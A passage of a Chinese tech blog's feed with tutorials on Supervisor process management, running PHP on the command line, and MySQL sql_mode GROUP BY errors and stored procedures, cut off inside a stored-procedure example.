&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Expression #5 of SELECT list is not in GROUP BY clause and contains nonaggregated column &amp;#39;cis.q1.query_date&amp;#39; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;which is not functionally dependent on columns in GROUP BY clause; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;this is incompatible with sql_mode&amp;#x3D;only_full_group_by&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>Supervisor 快速上手</title>
    <link href="https://www.0x2beace.com/supervisor-quick-start/"/>
    <id>https://www.0x2beace.com/supervisor-quick-start/</id>
    <published>2020-07-30T12:38:38.000Z</published>
    <updated>2020-09-04T13:54:06.076Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://supervisord.org/" target="_blank" rel="noopener">supervisord</a> 是一个用 Python 写的进程管理工具，是类Unix系统中的一个进程管理工具，</p><p><code>Supervisor</code> 只适用于类Unix 系统，不适用于Window。</p><a id="more"></a><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>因为<code>Supervisor</code> 是用 <code>Python</code> 所写的，所以可以直接使用<code>pip</code> 安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install supervisor</span><br></pre></td></tr></table></figure><p>Ubuntu：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install supervisor</span><br></pre></td></tr></table></figure><p>Mac：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install supervisor</span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p><code>Supervisor</code>运行时会启动一个进程——<code>supervisord</code> 。</p><ul><li><code>supervisord</code>：它负责启动所管理的进程，并将所管理的进程作为自己的子进程来启动，而且可以在所管理的进程出现崩溃时自动重启。</li><li><code>supervisorctl</code>：是命令行管理工具，可以用来执行 stop、start、restart 等命令，来对这些子进程进行管理。</li></ul><p>查看默认配置项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ echo_supervisord_conf</span><br></pre></td></tr></table></figure><p>将默认配置项重定向至配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ echo_supervisord_conf &gt; &#x2F;etc&#x2F;supervisord.conf</span><br></pre></td></tr></table></figure><p>然后可以看到 <code>/etc/</code> 配置文件下出现了以下文件，其中<code>/etc/supervisor</code> 是我们需要的配置文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ find &#x2F;etc&#x2F; -name supervisor</span><br><span class="line">&#x2F;etc&#x2F;default&#x2F;supervisor</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;supervisor</span><br><span class="line">&#x2F;etc&#x2F;supervisor</span><br></pre></td></tr></table></figure><p><code>/etc/supervisord.conf</code> 核心配置文件，参考以下部分配置，<code>;</code> 表示注释。</p><p>因为<code>Supervisor</code>默认配置会把socket文件和pid守护进程生成在/tmp/目录下，/tmp/目录是缓存目录，所以我们需要手动换成<code>/var/run</code>目录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[unix_http_server]</span><br><span class="line">;file&#x3D;&#x2F;tmp&#x2F;supervisor.sock   ; UNIX socket 文件，supervisorctl 会使用</span><br><span class="line">file&#x3D;&#x2F;var&#x2F;run&#x2F;supervisor.sock   ; 修改为 &#x2F;var&#x2F;run 目录，避免被系统删除</span><br><span class="line">;chmod&#x3D;0700                 ; socket 文件的 mode，默认是 0700</span><br><span class="line">;chown&#x3D;nobody:nogroup       ; socket 文件的 owner，格式： uid:gid</span><br><span class="line"></span><br><span class="line">;[inet_http_server]         ; HTTP 服务器，提供 web 管理界面</span><br><span class="line">;port&#x3D;127.0.0.1:9001        ; Web 管理后台运行的 IP 和端口，如果开放到公网，需要注意安全性</span><br><span class="line">;username&#x3D;user              ; 登录管理后台的用户名</span><br><span class="line">;password&#x3D;123               ; 登录管理后台的密码</span><br><span class="line"></span><br><span class="line">[supervisord]</span><br><span class="line">;logfile&#x3D;&#x2F;tmp&#x2F;supervisord.log ; 日志文件，默认是 $CWD&#x2F;supervisord.log</span><br><span class="line">logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;supervisord.log ; 修改为 &#x2F;var&#x2F;log 目录，避免被系统删除</span><br><span class="line">logfile_maxbytes&#x3D;50MB        ; 日志文件大小，超出会 rotate，默认 50MB</span><br><span class="line">logfile_backups&#x3D;10           ; 日志文件保留备份数量默认 10</span><br><span class="line">loglevel&#x3D;info                ; 日志级别，默认 info，其它: debug,warn,trace</span><br><span class="line">;pidfile&#x3D;&#x2F;tmp&#x2F;supervisord.pid ; pid 文件</span><br><span class="line">pidfile&#x3D;&#x2F;var&#x2F;run&#x2F;supervisord.pid ; 修改为 &#x2F;var&#x2F;run 目录，避免被系统删除</span><br><span class="line">nodaemon&#x3D;false               ; 是否在前台启动，默认是 false，即以 daemon 的方式启动</span><br><span class="line">minfds&#x3D;1024                  ; 可以打开的文件描述符的最小值，默认 1024</span><br><span class="line">minprocs&#x3D;200                 ; 可以打开的进程数的最小值，默认 200</span><br><span class="line"></span><br><span class="line">; the below section must remain in the config file for RPC</span><br><span class="line">; (supervisorctl&#x2F;web interface) to work, additional interfaces may be</span><br><span class="line">; added by defining them in separate rpcinterface: sections</span><br><span class="line">[rpcinterface:supervisor]</span><br><span class="line">supervisor.rpcinterface_factory &#x3D; supervisor.rpcinterface:make_main_rpcinterface</span><br><span class="line"></span><br><span class="line">[supervisorctl]</span><br><span class="line">;serverurl&#x3D;unix:&#x2F;&#x2F;&#x2F;tmp&#x2F;supervisor.sock ; 通过 UNIX socket 连接 supervisord，路径与 unix_http_server 部分的 file 一致</span><br><span class="line">serverurl&#x3D;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;supervisor.sock ; 修改为 &#x2F;var&#x2F;run 目录，避免被系统删除</span><br><span class="line">;serverurl&#x3D;http:&#x2F;&#x2F;127.0.0.1:9001 ; 通过 HTTP 的方式连接 supervisord</span><br><span class="line"></span><br><span class="line">; 包含其他的配置文件</span><br><span class="line">[include]</span><br><span class="line">files &#x3D; relative&#x2F;directory&#x2F;*.ini    ; 可以是 *.conf 或 *.ini</span><br></pre></td></tr></table></figure><p><code>/etc/supervisor/conf.d</code> 则是用来配置管理进程的配置文件，所有需要被<code>supervisor</code> 管理的进程都需要在这里先配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[program:demo]</span><br><span class="line">command&#x3D;php demo.php  &#x2F;&#x2F; 需要执行队列的名称</span><br><span class="line">directory&#x3D; &#x2F;var&#x2F;www  &#x2F;&#x2F; 命令执行的目录或者说执行 command 之前，先切换到工作目录 可以理解为在执行命令前会切换到这个目录 </span><br><span class="line">process_name&#x3D;%(process_num)02d &#x2F;&#x2F; 默认为 %(program_name)s，即 [program:x] 中的 x这个是进程名，如果下面的numprocs参数为1的话，就不用管这个参数了，它默认值%(program_name)s也就是上面的那个program冒号后面的</span><br><span class="line"></span><br><span class="line">numprocs&#x3D;1          &#x2F;&#x2F; 进程数量当不为1时的时候，就是进程池的概念，注意process_name的设置</span><br><span class="line">autostart&#x3D;true    &#x2F;&#x2F; 是否自动启动</span><br><span class="line">autorestart&#x3D;true      &#x2F;&#x2F; 程序意外退出是否自动重启</span><br><span class="line">startsecs&#x3D;1       &#x2F;&#x2F; 自动重启间隔 </span><br><span class="line">startretries&#x3D;20   &#x2F;&#x2F; 当进程启动失败后，最大尝试启动的次数。。当超过3次后，supervisor将把此进程的状态置为FAIL 默认值为3</span><br><span class="line">redirect_stderr&#x3D;true  &#x2F;&#x2F; 如果为true，则stderr的日志会被写入stdout日志文件中  理解为重定向输出的日志</span><br><span class="line">user&#x3D;root   &#x2F;&#x2F; 这个参数可以设置一个非root用户，当我们以root用户启动supervisord之后。我这里面设置的这个用户，也可以对supervisord进行管理 </span><br><span class="line">stopsignal&#x3D;INT</span><br><span class="line">stderr_logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;demo.err.log   &#x2F;&#x2F; 子进程的stdout的日志路径 输出日志文件</span><br><span class="line">stdout_logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;demo.out.log   &#x2F;&#x2F; 错误日志文件 当redirect_stderr&#x3D;true。这个就不用</span><br></pre></td></tr></table></figure><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ supervisord -c &#x2F;etc&#x2F;supervisord.conf</span><br></pre></td></tr></table></figure><h3 id="常用命令整理"><a href="#常用命令整理" class="headerlink" title="常用命令整理"></a>常用命令整理</h3><p>停止进程，program_name 为 [program:x] 里的 x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl stop program_name</span><br></pre></td></tr></table></figure><p>启动进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl start program_name</span><br></pre></td></tr></table></figure><p>重启进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl restart program_name</span><br></pre></td></tr></table></figure><p>结束所有属于名为 groupworker 这个分组的进程 (start，restart 同理)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl stop groupworker:</span><br></pre></td></tr></table></figure><p>结束 groupworker:name1 这个进程 (start，restart 同理)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl stop groupworker:name1</span><br></pre></td></tr></table></figure><p>停止全部进程，注：start、restart、stop 都不会载入最新的配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl stop all</span><br></pre></td></tr></table></figure><p>载入最新的配置文件，停止原有进程并按新的配置启动、管理所有进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl reload</span><br></pre></td></tr></table></figure><p>根据最新的配置文件，启动新配置或有改动的进程，配置没有改动的进程不会受影响而重启</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl update</span><br></pre></td></tr></table></figure><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><h4 id="unlinking-stale-socket-var-run-supervisor-sock"><a href="#unlinking-stale-socket-var-run-supervisor-sock" class="headerlink" title="unlinking stale socket /var/run/supervisor.sock"></a>unlinking stale socket /var/run/supervisor.sock</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ find &#x2F; -name supervisor.sock</span><br><span class="line">&#x2F;run&#x2F;supervisor.sock</span><br><span class="line"></span><br><span class="line">$ unlink &#x2F;run&#x2F;supervisor.sock</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://m.aluaa.com/articles/2019/01/02/1546398594207.html" target="_blank" rel="noopener">“unix:///tmp/supervisor.sock no such file” 错误处理</a></li><li><a href="https://segmentfault.com/a/1190000015768529" target="_blank" rel="noopener">https://segmentfault.com/a/1190000015768529</a></li><li><a href="http://liyangliang.me/posts/2015/06/using-supervisor/" target="_blank" rel="noopener">使用 supervisor 管理进程</a></li><li><a href="https://www.cnblogs.com/restran/p/4854623.html" target="_blank" rel="noopener">Python 进程管理工具 Supervisor 使用教程</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;http://supervisord.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;supervisord&lt;/a&gt; 是一个用 Python 写的进程管理工具，是类Unix系统中的一个进程管理工具，&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Supervisor&lt;/code&gt; 只适用于类Unix 系统，不适用于Window。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/PHP/Tutorial/"/>
    
    <category term="进程管理" scheme="https://www.0x2beace.com/categories/PHP/Tutorial/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="进程管理" scheme="https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"/>
    
    <category term="Supervisor" scheme="https://www.0x2beace.com/tags/Supervisor/"/>
    
  </entry>
  
  <entry>
    <title>在 Linux 命令行中执行和使用 PHP 代码</title>
    <link href="https://www.0x2beace.com/execute-and-use-php-code-on-the-linux-command-line/"/>
    <id>https://www.0x2beace.com/execute-and-use-php-code-on-the-linux-command-line/</id>
    <published>2020-07-29T00:08:12.000Z</published>
    <updated>2020-07-29T00:25:28.412Z</updated>
    
    <content type="html"><![CDATA[<p>众所周知，PHP是一门脚本语言，主要用于服务端（JavaScript 用于客户端）以通过HTTP 生成动态网页。</p><p>所以与其他脚本语言一样，可以直接在终端中不需要网页浏览器来运行PHP 代码。</p><a id="more"></a><h2 id="获取安装信息"><a href="#获取安装信息" class="headerlink" title="获取安装信息"></a>获取安装信息</h2><p>在安装完PHP 以及Nginx 之后，接下来我们通常需要做的是，在<code>/usr/local/var/www</code> (Mac 上的Nginx 工作目录)上创建一个内容为<code>&lt;?php phpinfo(); ?&gt;</code>，名为index.php的文件来测试PHP 是否安装正确。</p><p>执行以下命令即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt; &#x2F;usr&#x2F;local&#x2F;var&#x2F;www&#x2F;index.php</span><br></pre></td></tr></table></figure><p>然后，使用浏览器访问<code>http://127.0.0.1/index.php</code>，不出意外可以看到：<br><img src="https://i.loli.net/2020/03/19/m62QoSYvKuGfDUF.png" alt="image.png"></p><blockquote><p>如何在终端中直接查看该信息？</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># php -f &#x2F;usr&#x2F;local&#x2F;var&#x2F;www&#x2F;index.php | less</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/19/6wmv8h1RUa9d5jX.png" alt="image.png"></p><p>如果你觉得上面这种方式太麻烦了，那么还有一种更简便的方式可以达到同样的效果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># php -r &#39;php phpinfo();&#39; | less</span><br></pre></td></tr></table></figure><h3 id="交互模式"><a href="#交互模式" class="headerlink" title="交互模式"></a>交互模式</h3><p>有时候我们会遇到这样一种情况，想测试一小段代码，看看其运行结果，但是又不想重新创建一个文件，太麻烦了。</p><p>如果这个时候有一个地方可以直接运行这段代码且输出结果，那该多好啊。</p><p>PHP 为我们提供了两种交互模式，前者是自动的，后者是手动的。</p><ol><li>Interactive shell</li><li>Interactive mode enabled</li></ol><p>两种模式都是使用 <code>php -a</code> 命令进入。</p><h4 id="Interactive-shell"><a href="#Interactive-shell" class="headerlink" title="Interactive shell"></a>Interactive shell</h4><p>使用这个交互式shell，你可以直接在命令行窗口里输入PHP并直接获得输出结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ php -a</span><br><span class="line">Interactive shell</span><br><span class="line"></span><br><span class="line">php &gt;echo &quot;Hello PHP&quot;;</span><br><span class="line">Hello PHP</span><br><span class="line">php &gt; echo 10+90;</span><br><span class="line">100</span><br></pre></td></tr></table></figure><p>回车即可查看输出内容。</p><h4 id="Interactive-mode-enabled"><a href="#Interactive-mode-enabled" class="headerlink" title="Interactive mode enabled"></a>Interactive mode enabled</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ php -a</span><br><span class="line">Interactive mode enabled</span><br><span class="line"></span><br><span class="line">php &gt;echo &quot;Hello PHP&quot;;</span><br></pre></td></tr></table></figure><p>如果出现的是这个模式，说明你的PHP并不支持交互式shell，</p><p>不过不用担心，这个模式同样也可以执行PHP 代码，只是代码的执行方式有些区别。</p><p>输入了所有PHP代码后，输入<code>Ctrl-Z</code>（windows里），或输入<code>Ctrl-D</code>（linux里），你输入的所有代码将会一次执行完成并输出结果。</p><p>输入<code>exit</code>或者<code>⌃ + c</code> 退出交互模式。</p><h3 id="PHP脚本"><a href="#PHP脚本" class="headerlink" title="PHP脚本"></a>PHP脚本</h3><p>在终端中可以把PHP 脚本作为Shell 脚本来运行。</p><p>首先你需要创建一个PHP 脚本文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># echo -e &#39;#!&#x2F;usr&#x2F;bin&#x2F;php\n&lt;?php phpinfo();?&gt;&#39; &gt; phpscript.php</span><br></pre></td></tr></table></figure><p><code>-e</code> 表示激活转义字符。</p><p>注意，这个脚本文件中的第一行<code>#!/usr/bin/php</code>，就像是Shell 脚本中的<code>#!/bin/bash</code>。目的是告诉Linux 命令行使用PHP 解析器来解析该文件。</p><p>运行该脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># chmod +x phpscript.php  &#x2F;&#x2F; 使脚本具有执行权限</span><br><span class="line"># .&#x2F;phpscript.php   &#x2F;&#x2F;执行脚本</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><code>php -a</code>：进入交互模式</li><li><code>php -f</code>：解析和执行文件</li><li><code>php -h</code>：获取帮助</li><li><code>php -i</code>：查看PHP 信息和配置</li><li><code>php -m</code>：显示已经安装的模块</li><li><code>php -r</code>：运行PHP代码不使用脚本标签’<?..?>‘</li><li><code>php -v</code>：查看PHP cli版本</li><li><code>php -ini</code>：查看php.ini 配置文件</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;众所周知，PHP是一门脚本语言，主要用于服务端（JavaScript 用于客户端）以通过HTTP 生成动态网页。&lt;/p&gt;
&lt;p&gt;所以与其他脚本语言一样，可以直接在终端中不需要网页浏览器来运行PHP 代码。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Shell" scheme="https://www.0x2beace.com/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>如何解决“ORDER BY子句不在SELECT列表中”的问题</title>
    <link href="https://www.0x2beace.com/list-causes-mysql-5-7-with-select-distinct-and-order-by/"/>
    <id>https://www.0x2beace.com/list-causes-mysql-5-7-with-select-distinct-and-order-by/</id>
    <published>2020-07-28T00:29:37.000Z</published>
    <updated>2020-07-28T15:28:10.444Z</updated>
    
    <content type="html"><![CDATA[<p>记录一个最近遇到的Mysql 问题。</p><a id="more"></a><blockquote><p>问题描述：<br>在本地项目中，部分SQL 语句执行起来，总是会报一个错。<br>而同样的SQL，在线上的服务器中执行起来没有任何问题。</p></blockquote><p>错误提示内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Expression #2 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#39;foodorder.orderlist.cname&#39; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode&#x3D;only_full_group_by QMYSQL: Unable to execute query</span><br></pre></td></tr></table></figure><p>我的第一反应就是检查Mysql 的版本，很巧的是本地Mysql<br>的版本确实比服务器的版本低一些。很快我就想到一定是版本存在差异性，导致语法不兼容。</p><h2 id="升级Mysql"><a href="#升级Mysql" class="headerlink" title="升级Mysql"></a>升级Mysql</h2><p>既然是版本不一的问题，那就升级本地的Mysql 好了。</p><p>因为我的Mysql 是之前通过Homebrew 安装的，所以如需要升级，根本不用我自己手动去寻找安装包，直接通过Homebrew 的Upgrade 命令自动升级就好了。</p><p>起初我还担心自动升级会不会把我的Mysql 的版本更新的<code>5.7</code>以上，后来证明是我想多了。</p><p>不过在正式更新之前需要做好以下几件事情：</p><ul><li>对数据库做好必要的备份</li><li>停止本地Mysql 服务</li><li>确定所要更新的Mysql 版本</li></ul><p>做好以上三件事之后，就可以开始升级了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ brew search mysql</span><br><span class="line">mysql@5.7 ✔</span><br><span class="line">$ brew upgrade mysql@5.7</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>终于安装好之后，再次开启Mysql 的服务，我发现还是没有解决我的问题，还是会提示相同的错误。</p><p>这时候我才意识到这个问题和Mysql 的版本没有关系，有关系应该是相关的模块。</p><p>通过查阅一番资料，才发现是因为 <code>group by</code> 中的列一定要出现在 <code>select</code> 中，除非强制 <code>sqlmode</code> 中使用 <code>ONLY_FULL_GROUP_BY</code>。</p><h2 id="开启sql-mode-模式"><a href="#开启sql-mode-模式" class="headerlink" title="开启sql-mode 模式"></a>开启sql-mode 模式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;my.cnf</span><br><span class="line"></span><br><span class="line"># 增加如下内容</span><br><span class="line">[mysqld]</span><br><span class="line">sql_mode&#x3D;&#39;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&#39;;</span><br><span class="line"></span><br><span class="line"># 或者</span><br><span class="line">[mysqld]</span><br><span class="line">sql_mode &#x3D; &quot;&quot;</span><br></pre></td></tr></table></figure><p>重启Mysql 服务器，即可。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://stackoverflow.com/questions/36829911/how-to-resolve-order-by-clause-is-not-in-select-list-caused-mysql-5-7-with-sel/39353160" target="_blank" rel="noopener"> 如何解决 MySQL 5.7带有SELECT DISTINCT和ORDER BY的问题 | stack voerflow </a></li><li><a href="https://dev.mysql.com/doc/refman/5.7/en/sql-mode.html" target="_blank" rel="noopener">Mysql 服务器SQL 模式</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录一个最近遇到的Mysql 问题。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>Mysql 存储过程入门</title>
    <link href="https://www.0x2beace.com/getting-started-with-mysql-stored-procedures/"/>
    <id>https://www.0x2beace.com/getting-started-with-mysql-stored-procedures/</id>
    <published>2020-07-27T15:50:50.000Z</published>
    <updated>2020-07-27T15:51:55.775Z</updated>
    
    <content type="html"><![CDATA[<p>最近面临一个需求，需要使用Mysql 写一段存储过程，对数据库中的数据表做批量操作。</p><p>应该算是知识盲区了，花了一些时间去学习如何写好一个存储过程，最终也顺利写出来了，记录一下。</p><a id="more"></a><p>以下两点是其中比较重要的部分：</p><ol><li>关于变量的使用</li><li>在存储过程中使用动态SQL 语句</li></ol><h2 id="存储过程中的变量"><a href="#存储过程中的变量" class="headerlink" title="存储过程中的变量"></a>存储过程中的变量</h2><p>MySQL存储过程常见的变量：局部变量、用户变量、系统变量。</p><h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><p>在过程体中，可以声明局部变量，用来临时保存一些值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DECLARE  var_name[, var_name] ...  type [DEFAULT value];</span><br></pre></td></tr></table></figure><p>其中，type为MySQL的数据类型，如:int、float、date、varchar(length) 。</p><p>使用局部变量时，需要注意以下两点：</p><ol><li>DECLARE用来声明局部变量，且DECLARE仅被用在BEGIN … END复合语句里，并且必须在复合语句的开头，在任何其它语句之前；可以被用在嵌套的块中，除了那些用相同名字声明变量的块。</li><li>如果要给变量提供一个默认值，使用DEFAULT子句(值可以是常数，也可以指定为一个表达式)；如果没有DEFAULT子句，初始值为NULL。</li></ol><h3 id="用户变量"><a href="#用户变量" class="headerlink" title="用户变量"></a>用户变量</h3><p>用户变量与数据库连接有关：在当前连接中声明的变量，在连接断开的时候，就会消失；在此连接中声明的变量无法在另一连接中使用。</p><p>用户变量使用<code>@</code>关键字去定义。</p><h2 id="在存储过程中动态执行SQL"><a href="#在存储过程中动态执行SQL" class="headerlink" title="在存储过程中动态执行SQL"></a>在存储过程中动态执行SQL</h2><p>其实这个理解成一套模版，只要按照标准去执行这套模版，就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">-- 连接数据库</span><br><span class="line">use databaseName;</span><br><span class="line">-- 定义结束符为 $$</span><br><span class="line">delimiter $$</span><br><span class="line">-- 判断是否存在该名称的存储过程，如果存在就删除</span><br><span class="line">drop procedure if exists wk;</span><br><span class="line">-- 创建新的存储过程</span><br><span class="line">create procedure wk()</span><br><span class="line">begin</span><br><span class="line">        -- 声明变量</span><br><span class="line">        declare days int default 366;</span><br><span class="line">        declare dates int;</span><br><span class="line">-- 循环体</span><br><span class="line">WHILE days - 1 &gt; 0 DO</span><br><span class="line">        -- 为变量赋值</span><br><span class="line">    SET dates &#x3D; 